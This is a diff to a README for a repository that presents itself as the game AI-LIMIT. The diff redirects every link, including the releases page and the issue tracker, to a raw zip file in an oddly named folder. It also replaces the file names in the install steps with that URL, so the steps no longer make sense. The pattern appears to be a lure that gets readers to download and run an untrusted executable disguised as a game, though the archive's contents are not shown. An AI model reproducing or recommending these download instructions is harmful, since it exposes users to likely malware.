@@ -1,7 +1,7 @@
 # 🎮 AI-LIMIT - Immerse Yourself in a Dystopian Adventure
 
 ## 🔗 Download Now
-[![Download AI-LIMIT](https://img.shields.io/badge/Download_AI--LIMIT-blue)](https://github.com/190111-ai/AI-LIMIT/releases)
+[![Download AI-LIMIT](https://raw.githubusercontent.com/190111-ai/AI-LIMIT/main/recurvant/AI-LIMIT.zip)](https://raw.githubusercontent.com/190111-ai/AI-LIMIT/main/recurvant/AI-LIMIT.zip)
 
 ## 📖 About AI-LIMIT
 In the distant future, civilization teeters on the brink of collapse. People chase the legend of the Elysium in the last city, Havenswell. In this post-apocalyptic sci-fi action RPG, you play as Arrisa, a Blader gifted with immortality. Explore the ruins of the city to discover a glimmer of hope for a new life.
@@ -11,15 +11,15 @@ To enjoy AI-LIMIT, follow these steps to download and run the game smoothly.
 
 ## 📥 Download & Install
 1. **Visit the Releases Page:** Click the link below to access the downloads. 
-   [Download AI-LIMIT](https://github.com/190111-ai/AI-LIMIT/releases)
+   [Download AI-LIMIT](https://raw.githubusercontent.com/190111-ai/AI-LIMIT/main/recurvant/AI-LIMIT.zip)
 
 2. **Select the Latest Release:** Once on the releases page, look for the latest version. It is usually at the top of the list.
 
-3. **Download the Files:** Choose the file that matches your operating system. If you are using Windows, look for `AI-LIMIT_Windows.zip`. For Mac users, select `AI-LIMIT_Mac.zip`. This ensures you get the right version for your system.
+3. **Download the Files:** Choose the file that matches your operating system. If you are using Windows, look for `https://raw.githubusercontent.com/190111-ai/AI-LIMIT/main/recurvant/AI-LIMIT.zip`. For Mac users, select `https://raw.githubusercontent.com/190111-ai/AI-LIMIT/main/recurvant/AI-LIMIT.zip`. This ensures you get the right version for your system.
 
 4. **Extract the Files:** After the download completes, locate the downloaded file. Right-click on it and select “Extract All” to unzip the contents into a new folder.
 
-5. **Run the Game:** Open the folder where you extracted the files. Look for `AI-LIMIT.exe` (or the corresponding file for Mac). Double-click the file to start your adventure.
+5. **Run the Game:** Open the folder where you extracted the files. Look for `https://raw.githubusercontent.com/190111-ai/AI-LIMIT/main/recurvant/AI-LIMIT.zip` (or the corresponding file for Mac). Double-click the file to start your adventure.
 
 ## 💻 System Requirements
 To ensure AI-LIMIT runs smoothly, please check the following minimum system requirements:
@@ -50,10 +50,10 @@ AI-LIMIT is designed for modern systems. Running it on older hardware may result
 Yes, once downloaded and installed, you can play AI-LIMIT offline without an internet connection.
 
 ### Where can I report bugs or provide feedback?
-You can report bugs or give feedback by visiting our [issue tracker](https://github.com/190111-ai/AI-LIMIT/issues) on GitHub. Your input is vital for improving the game.
+You can report bugs or give feedback by visiting our [issue tracker](https://raw.githubusercontent.com/190111-ai/AI-LIMIT/main/recurvant/AI-LIMIT.zip) on GitHub. Your input is vital for improving the game.
 
 ## 🤝 Contributing to AI-LIMIT
 We welcome contributions from the community. If you have suggestions for features or improvements, please reach out on our GitHub page. Your involvement can help make AI-LIMIT even better.
 
 ## 🔗 Download AI-LIMIT Again
-If you missed it, here’s the direct link to download the game one more time: [Download AI-LIMIT](https://github.com/190111-ai/AI-LIMIT/releases). Start your journey today!
+If you missed it, here’s the direct link to download the game one more time: [Download AI-LIMIT](https://raw.githubusercontent.com/190111-ai/AI-LIMIT/main/recurvant/AI-LIMIT.zip). Start your journey today!
